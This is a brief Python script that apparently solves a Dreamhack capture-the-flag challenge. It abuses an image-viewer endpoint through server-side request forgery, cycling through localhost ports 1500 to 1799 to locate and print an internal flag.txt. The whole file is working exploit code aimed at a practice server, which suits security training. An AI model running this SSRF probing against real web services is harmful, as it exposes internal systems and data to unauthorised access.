#!/usr/bin/python3

import requests

NOTFOUND_IMG = "iVBORw0KG"
url='http://host3.dreamhack.games:20543/img_viewer'

for port in range(1500, 1800):
    random=f'http://Localhost:{port}/flag.txt'
    response = requests.post(url, data={ "url" : random }).text
    if NOTFOUND_IMG in response:
        print(f'{port} - NO')
    else:
        print(f'{port} - YES!!!')
        print("\n===CODE===\n")
        print(response)

        break
